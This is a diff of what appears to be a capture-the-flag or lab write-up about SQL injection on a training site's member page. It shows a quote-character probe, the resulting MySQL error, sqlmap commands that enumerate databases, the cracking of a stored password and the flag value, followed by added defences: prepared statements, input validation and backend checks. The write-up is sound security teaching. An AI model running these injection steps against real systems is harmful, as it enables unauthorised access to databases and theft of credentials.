@@ -1,10 +1,12 @@
 # SQL injection
 The member page [http://10.203.72.119/?page=member](http://10.203.72.119/?page=member "member page") is vunerable to ***sql injection***
 
+## Method
 If we submit a ***'*** as the member id 
 [http://10.203.72.119/?page=member&id=%27&Submit=Submit#](http://10.203.72.119/?page=member&id=%27&Submit=Submit#)
+. We will get the output below.
 
->You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1
+*'' You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1 ''*
 
 We can then use ***sqlmap***, which with this command.
 ``` bash
@@ -20,7 +22,7 @@ Futhering this process we then check the names of the databases they have, achiv
 ```bash
 sqlmap -u '10.203.72.119/?page=members&id=1' --dbs
 ```
-We then get this output
+We then get the following output
 ```bash
 [03:54:15] [INFO] the back-end DBMS is MySQL
 back-end DBMS: MySQL >= 5.5
@@ -66,8 +68,8 @@ Table: users
 ```
 We then follow the instructions to decrypt the password, which decrypts to ***FortyTwo***, then lower all characters to ***fortytwo***. Then converted to sh256 will result to ***10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5*** which is the flag
 
-## Manipulation
-
-## Solution
-
+## Solutions
+1. Using prepared statements given that this site uses ***PHP***, prepared help the database distinguish between the ***code*** and ***user input***, by pre-compliling ***SQL*** statements to be then used as input. For ***PHP*** using ***PDO*** is one of the solutions.
+1. Validating input, making use of ***regular expression*** to validate thee user input whether it matches the expected input, checking whether it contains special charcters, which would be incorrect if the input is to be a surname or name. This process can be called ***sanitization***.
+1. ***Backend*** validation is very important.
 
